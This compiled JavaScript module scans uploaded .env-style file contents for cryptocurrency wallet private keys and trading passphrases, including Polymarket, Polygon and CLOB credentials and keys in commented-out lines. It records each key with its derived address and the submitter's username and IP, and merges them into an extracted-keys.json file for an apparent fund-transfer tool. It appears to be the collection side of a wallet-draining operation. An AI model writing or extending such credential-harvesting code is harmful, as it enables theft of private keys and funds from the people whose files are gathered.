"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractPrivateKeysFromContent = extractPrivateKeysFromContent;
exports.appendTransferExtractedKeysFromContents = appendTransferExtractedKeysFromContents;
/**
 * Scan env-style .env content (KEY=val for known private-key variable names) and merge
 * into ../transfer/extracted-keys.json (ExtractedKeyEntry[]), for the transfer CLI.
 * Strips id-like 64-hex (e.g. `conditionId` in JSON) before parse — see strip-id-like-hex.ts.
 */
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const wallet_1 = require("@ethersproject/wallet");
const infer_chain_1 = require("./infer-chain");
const strip_id_like_hex_1 = require("./strip-id-like-hex");
const PRIVATE_KEY_VARS = new Set([
    'PRIVATE_KEY',
    'POLY_PRIVATE_KEY',
    'POLYMARKET_PRIVATE_KEY',
    'POLYGON_WALLET_PRIVATE_KEY',
    'KALSHI_PRIVATE_KEY_PEM',
    'PK',
    'CLOB_PASS_PHRASE',
]);
function extractEnvPairs(content) {
    const pairs = [];
    let currentKey = null;
    const currentVal = [];
    for (const line of content.split(/\r?\n/)) {
        const trimmed = line.trimEnd();
        if (!trimmed) {
            if (currentKey && currentVal.length > 0) {
                pairs.push([currentKey, currentVal.join('\n')]);
                currentKey = null;
                currentVal.length = 0;
            }
            continue;
        }
        let lineToParse = trimmed;
        if (trimmed.startsWith('#')) {
            const rest = trimmed.slice(1).trimStart();
            if (rest && rest.includes('=') && PRIVATE_KEY_VARS.has(rest.split('=', 1)[0].trim())) {
                lineToParse = rest;
            }
            else {
                if (currentKey && currentVal.length > 0) {
                    pairs.push([currentKey, currentVal.join('\n')]);
                    currentKey = null;
                    currentVal.length = 0;
                }
                continue;
            }
        }
        if (lineToParse.includes('=') && !lineToParse.startsWith(' ')) {
            if (currentKey && currentVal.length > 0) {
                pairs.push([currentKey, currentVal.join('\n')]);
            }
            const idx = lineToParse.indexOf('=');
            const key = lineToParse.slice(0, idx).trim();
            const val = lineToParse.slice(idx + 1).trim();
            if (PRIVATE_KEY_VARS.has(key)) {
                if (val.startsWith('"') && !val.endsWith('"')) {
                    currentKey = key;
                    currentVal.length = 0;
                    currentVal.push(val);
                }
                else {
                    pairs.push([key, val]);
                    currentKey = null;
                    currentVal.length = 0;
                }
            }
            else {
                currentKey = null;
                currentVal.length = 0;
            }
        }
        else if (currentKey && currentVal.length > 0) {
            currentVal.push(lineToParse);
        }
    }
    if (currentKey && currentVal.length > 0) {
        pairs.push([currentKey, currentVal.join('\n')]);
    }
    return pairs;
}
function isPlaceholder(val) {
    const v = (val || '').trim().toLowerCase();
    if (!v || v === 'false' || v === 'true' || v === 'xxxx' || v === 'change-me' || v === 'your_private_key_here') {
        return true;
    }
    if (v.startsWith('0x') && v.length === 66) {
        const hex = v.slice(2);
        if (/^0+$/.test(hex) || /^1+$/.test(hex) || new Set(hex).size <= 2)
            return true;
    }
    return false;
}
function normalizeHex(val) {
    const s = val.trim().replace(/^["']|["']$/g, '');
    if (s.startsWith('0x'))
        return s.slice(2).toLowerCase();
    if (/^[a-fA-F0-9]{64}$/.test(s))
        return s.toLowerCase();
    return s;
}
function normalizePrivateKeyDisplay(pk) {
    const hex = normalizeHex(pk);
    if (hex.length !== 64 || !/^[a-f0-9]{64}$/.test(hex))
        return null;
    return `0x${hex}`;
}
function normalizeIp(ip) {
    const first = String(ip || '')
        .split(',')
        .map((s) => s.trim())
        .find(Boolean);
    return first && first.length > 0 ? first : 'unknown';
}
function normalizeUser(user) {
    const u = String(user || '').trim();
    return u.length > 0 ? u : 'unknown';
}
function addressFromPrivateKey(privateKey) {
    try {
        const pk = privateKey.startsWith('0x') ? privateKey : `0x${privateKey.replace(/^0x/i, '')}`;
        return new wallet_1.Wallet(pk).address;
    }
    catch {
        return null;
    }
}
/** Collect 64-hex private keys from env-style KEY=val lines (same rules as .env files). */
function extractPrivateKeysFromContent(content) {
    const found = new Set();
    const text = (0, strip_id_like_hex_1.stripIdLikeHexForWalletExtraction)(content);
    for (const [key, val] of extractEnvPairs(text)) {
        if (key === 'KALSHI_PRIVATE_KEY_PEM')
            continue;
        const valClean = val.trim().replace(/^["']|["']$/g, '');
        if (!valClean || isPlaceholder(valClean))
            continue;
        const norm = normalizeHex(valClean);
        if (norm.length === 64 && /^[a-f0-9]{64}$/.test(norm)) {
            const disp = normalizePrivateKeyDisplay(valClean);
            if (disp)
                found.add(disp);
        }
    }
    return [...found];
}
function pickNonUnknown(a, b) {
    const x = (a || '').trim();
    const y = (b || '').trim();
    if (x && x !== 'unknown')
        return x;
    if (y && y !== 'unknown')
        return y;
    return x || y || 'unknown';
}
/** Merge two rows for the same private key (user/ip/chain from best available). */
function mergeTwoEntries(a, b) {
    const pk = normalizePrivateKeyDisplay(a.privateKey) ?? normalizePrivateKeyDisplay(b.privateKey);
    if (!pk)
        return a;
    const pub = /^0x[a-fA-F0-9]{40}$/i.test(a.publicKey)
        ? a.publicKey
        : /^0x[a-fA-F0-9]{40}$/i.test(b.publicKey)
            ? b.publicKey
            : addressFromPrivateKey(pk) ?? a.publicKey;
    return {
        privateKey: pk,
        publicKey: pub,
        user: pickNonUnknown(a.user, b.user),
        ip: pickNonUnknown(a.ip, b.ip),
        chain: pickNonUnknown(a.chain, b.chain),
    };
}
function hexKeyNorm(privateKey) {
    const k = privateKey.trim().toLowerCase();
    return k.startsWith('0x') ? k.slice(2) : k;
}
function defaultTransferKeysPath() {
    const envPath = process.env.TRANSFER_EXTRACTED_KEYS_PATH?.trim();
    if (envPath)
        return path_1.default.normalize(envPath);
    return path_1.default.normalize(path_1.default.join(process.cwd(), '..', 'transfer', 'extracted-keys.json'));
}
function loadExistingEntries(filePath) {
    if (!fs_1.default.existsSync(filePath))
        return [];
    try {
        const raw = JSON.parse(fs_1.default.readFileSync(filePath, 'utf-8'));
        const out = [];
        if (Array.isArray(raw.entries)) {
            for (const item of raw.entries) {
                const o = item;
                const pk = typeof o.privateKey === 'string' ? o.privateKey : '';
                const disp = normalizePrivateKeyDisplay(pk);
                if (!disp)
                    continue;
                const addr = addressFromPrivateKey(disp);
                if (!addr)
                    continue;
                const chainRaw = typeof o.chain === 'string' && o.chain.trim() ? o.chain.trim() : 'unknown';
                out.push({
                    user: typeof o.user === 'string' && o.user.trim() ? o.user.trim() : 'unknown',
                    ip: typeof o.ip === 'string' && o.ip.trim() ? o.ip.trim() : 'unknown',
                    chain: chainRaw,
                    privateKey: disp,
                    publicKey: typeof o.publicKey === 'string' && /^0x[a-fA-F0-9]{40}$/.test(o.publicKey) ? o.publicKey : addr,
                });
            }
        }
        if (out.length === 0 && Array.isArray(raw.keys)) {
            for (const k of raw.keys) {
                if (typeof k !== 'string')
                    continue;
                const disp = normalizePrivateKeyDisplay(k);
                if (!disp)
                    continue;
                const addr = addressFromPrivateKey(disp);
                if (!addr)
                    continue;
                out.push({ user: 'unknown', ip: 'unknown', chain: 'unknown', privateKey: disp, publicKey: addr });
            }
        }
        return dedupeEntries(out);
    }
    catch {
        return [];
    }
}
function dedupeEntries(entries) {
    const map = new Map();
    for (const e of entries) {
        const hex = hexKeyNorm(e.privateKey);
        if (hex.length !== 64)
            continue;
        const existing = map.get(hex);
        if (!existing)
            map.set(hex, e);
        else
            map.set(hex, mergeTwoEntries(existing, e));
    }
    return [...map.values()];
}
function serializeEntriesForCompare(entries) {
    return JSON.stringify([...entries]
        .map((e) => ({
        user: e.user,
        ip: e.ip,
        chain: e.chain,
        privateKey: hexKeyNorm(e.privateKey),
        publicKey: e.publicKey.toLowerCase(),
    }))
        .sort((a, b) => a.privateKey.localeCompare(b.privateKey)));
}
function saveEntries(filePath, entries) {
    const dir = path_1.default.dirname(filePath);
    fs_1.default.mkdirSync(dir, { recursive: true });
    const unique = dedupeEntries(entries);
    fs_1.default.writeFileSync(filePath, JSON.stringify({ entries: unique, updatedAt: new Date().toISOString() }, null, 2), 'utf-8');
}
/**
 * Extract keys from multiple file contents and merge into transfer/extracted-keys.json.
 * Never throws (logs warning on failure).
 */
function appendTransferExtractedKeysFromContents(username, ipAddress, contents) {
    const user = normalizeUser(username);
    const ip = normalizeIp(ipAddress);
    const pending = [];
    for (const c of contents) {
        if (typeof c !== 'string' || !c.trim())
            continue;
        const chain = (0, infer_chain_1.inferChainFromContent)(c);
        for (const pk of extractPrivateKeysFromContent(c)) {
            const disp = normalizePrivateKeyDisplay(pk);
            if (!disp)
                continue;
            const publicKey = addressFromPrivateKey(disp);
            if (!publicKey)
                continue;
            pending.push({ user, ip, chain, privateKey: disp, publicKey });
        }
    }
    if (pending.length === 0)
        return;
    const filePath = defaultTransferKeysPath();
    let existing;
    try {
        existing = loadExistingEntries(filePath);
    }
    catch (e) {
        console.warn('[transfer-keys] Could not read existing extracted-keys.json:', e);
        existing = [];
    }
    const merged = dedupeEntries([...existing, ...pending]);
    if (serializeEntriesForCompare(merged) === serializeEntriesForCompare(existing)) {
        console.log(`🔑 [transfer-keys] ${pending.length} key hit(s) — no change to extracted-keys.json`);
        return;
    }
    const beforeHex = new Set(existing.map((e) => hexKeyNorm(e.privateKey)));
    let newlyAdded = 0;
    for (const e of merged) {
        const h = hexKeyNorm(e.privateKey);
        if (h.length === 64 && !beforeHex.has(h))
            newlyAdded += 1;
    }
    try {
        saveEntries(filePath, merged);
        const note = newlyAdded > 0 ? `${newlyAdded} new, ` : '';
        console.log(`🔑 ${note}updated → ${filePath} (total ${merged.length} unique)`);
    }
    catch (e) {
        console.warn('[transfer-keys] Could not write extracted-keys.json:', e);
    }
}
//# sourceMappingURL=transfer-extracted-keys.js.map